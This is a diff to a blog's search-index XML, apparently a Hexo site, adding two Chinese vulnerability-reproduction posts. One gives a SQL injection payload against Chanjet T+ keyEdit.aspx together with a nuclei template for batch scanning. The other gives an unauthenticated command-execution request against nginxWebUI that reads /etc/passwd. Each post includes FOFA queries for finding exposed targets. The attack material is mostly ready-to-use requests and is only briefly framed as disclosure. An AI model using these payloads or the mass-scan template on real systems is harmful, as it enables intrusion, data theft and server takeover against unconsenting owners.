@@ -4,6 +4,60 @@
   
     
     <entry>
+      <title>畅捷通TPlus keyEdit.aspx接口存在SQL注入漏洞</title>
+      <link href="/2024/05/13/2024-05-13-chang-jie-tong-tplus-keyedit.aspx-jie-kou-cun-zai-sql-zhu-ru-lou-dong/"/>
+      <url>/2024/05/13/2024-05-13-chang-jie-tong-tplus-keyedit.aspx-jie-kou-cun-zai-sql-zhu-ru-lou-dong/</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。</p><h2 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="2.漏洞描述"></a>2.漏洞描述</h2><p>畅捷通T+专属云适用于需要一体化管理的企业，财务管理、业务管理、零售管理、生产管理、物流管理、移动仓管、营销管理、委外加工等人财货客一体化管理。畅捷通TPlus keyEdit.aspx接口存在SQL注入漏洞。</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>畅捷通T+</p><h2 id="4-fofa查询语句"><a href="#4-fofa查询语句" class="headerlink" title="4.fofa查询语句"></a>4.fofa查询语句</h2><p>app&#x3D;”畅捷通-TPlus”</p><h2 id="5-漏洞复现"><a href="#5-漏洞复现" class="headerlink" title="5.漏洞复现"></a>5.漏洞复现</h2><p>漏洞链接：<a href="https://xx.xx.xx.xx/tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20sys.fn_varbintohexstr(hashbytes(&#39;MD5&#39;,&#39;1&#39;)))%20--&amp;preload=1">https://xx.xx.xx.xx/tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20sys.fn_varbintohexstr(hashbytes(&#39;MD5&#39;,&#39;1&#39;)))%20--&amp;preload=1</a></p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;tplus&#x2F;UFAQD&#x2F;keyEdit.aspx?KeyID&#x3D;1%27%20and%201&#x3D;(select%20@@version)%20--&amp;preload&#x3D;1 HTTP&#x2F;1.1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36Accept-Encoding: gzip, deflateAccept: *&#x2F;*Connection: closeHost: xx.xxx.xxx.xxxAccept-Charset: utf-8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行select @@version</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20240513012025105.png"></p><h2 id="6-nuclei批量验证脚本"><a href="#6-nuclei批量验证脚本" class="headerlink" title="6.nuclei批量验证脚本"></a><strong>6.nuclei批量验证脚本</strong></h2><pre class="line-numbers language-none"><code class="language-none">d: changjietong_keyEdit_sqliinfo:  name: changjietong_keyEdit_sqli  author: recjl  severity: high  description: description  reference:    - https:&#x2F;&#x2F;  tags: tagsrequests:  - raw:      - |+        GET &#x2F;tplus&#x2F;UFAQD&#x2F;keyEdit.aspx?KeyID&#x3D;1%27%20and%201&#x3D;(select%20@@version)%20--&amp;preload&#x3D;1 HTTP&#x2F;1.1        Host: &#123;&#123;Hostname&#125;&#125;        Cache-Control: max-age&#x3D;0        Upgrade-Insecure-Requests: 1        User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;120.0.0.0 Safari&#x2F;537.36        Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7        Referer: http:&#x2F;&#x2F;&#x2F;tplus&#x2F;        Accept-Encoding: gzip, deflate, br        Accept-Language: zh-CN,zh;q&#x3D;0.9        Cookie: ASP.NET_SessionId&#x3D;wla51k11mgrzdaydypk0muzb        If-None-Match: W&#x2F;&quot;5b450e7e-666d&quot;        If-Modified-Since: Tue, 10 Jul 2018 19:52:30 GMT        Connection: close    matchers-condition: and    matchers:      - type: word        part: body        words:          - ion:u      - type: status        status:          - 200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> Markdown </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Typora </tag>
+            
+            <tag> Markdown </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>nginxWebUI 远程命令执行漏洞</title>
+      <link href="/2024/05/06/2024-05-06-nginxwebui-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
+      <url>/2024/05/06/2024-05-06-nginxwebui-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>​        nginxWebUI 是一款图形化管理 nginx 配置的工具，可以使用网页来快速配 置 nginx 的各项功能，包括 http 协议转发、tcp 协议转发、反向代理、负载均 衡、静态 html 服务器、ssl 证书自动申请、续签、配置等。配置好后可一键生 成 nginx.conf 文件，同时可控制 nginx 使用此文件进行启动与重载，完成对 ng inx 的图形化控制闭环。 </p><p>​        nginxWebUI 存在未授权远程命令执行漏洞，攻击者可以直接在服务器上执 行任意命令，甚至接管服务器。</p><h2 id="2-披露时间"><a href="#2-披露时间" class="headerlink" title="2.披露时间"></a>2.披露时间</h2><p>2023年6月28日</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><pre class="line-numbers language-none"><code class="language-none">nginxWebUI &lt;&#x3D; 3.4.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4.漏洞复现"></a>4.漏洞复现</h2><p>FOFA：<code>&quot;nginxWebUI&quot;</code></p><p>漏洞链接：<a href="http://127.0.0.1/AdminPage/conf/runCmd?cmd=id&&echo%20nginx">http://127.0.0.1/AdminPage/conf/runCmd?cmd=id%26%26echo%20nginx</a></p><p>漏洞数据包如下：</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;AdminPage&#x2F;conf&#x2F;runCmd?cmd&#x3D;cat%20&#x2F;etc&#x2F;passwd%26%26echo%20nginx HTTP&#x2F;1.1Host: X.X.X.XCache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;110.0.0.0 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Referer: http:&#x2F;&#x2F;X.X.X.XAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9,ak;q&#x3D;0.8Cookie: SOLONID&#x3D;fc7679940b1743b3aee1d4d233913cc3; SOLONID2&#x3D;69ddf221509a61bc6990d82d780db6b7; Hm_lvt_8acef669ea66f479854ecd328d1f348f&#x3D;1688881500; Hm_lpvt_8acef669ea66f479854ecd328d1f348f&#x3D;1688881500Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20240506011617677.png" alt="image-20240506011617677"></p><p>cmd参数可控，使用前部分命令需进行url编码</p><h2 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.修复方案"></a>5.修复方案</h2><p>厂商已发布了漏洞修复程序，请使用此产品的用户尽快更新至安全版本 <code>nginxWebUI &gt;= 3.4.</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Markdown </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Typora </tag>
+            
+            <tag> Markdown </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>微步批量查询威胁情报脚本(转载)</title>
       <link href="/2023/10/08/2023-00-08-wei-bu-pi-liang-cha-xun-wei-xie-qing-bao-jiao-ben-zhuan-zai/"/>
       <url>/2023/10/08/2023-00-08-wei-bu-pi-liang-cha-xun-wei-xie-qing-bao-jiao-ben-zhuan-zai/</url>
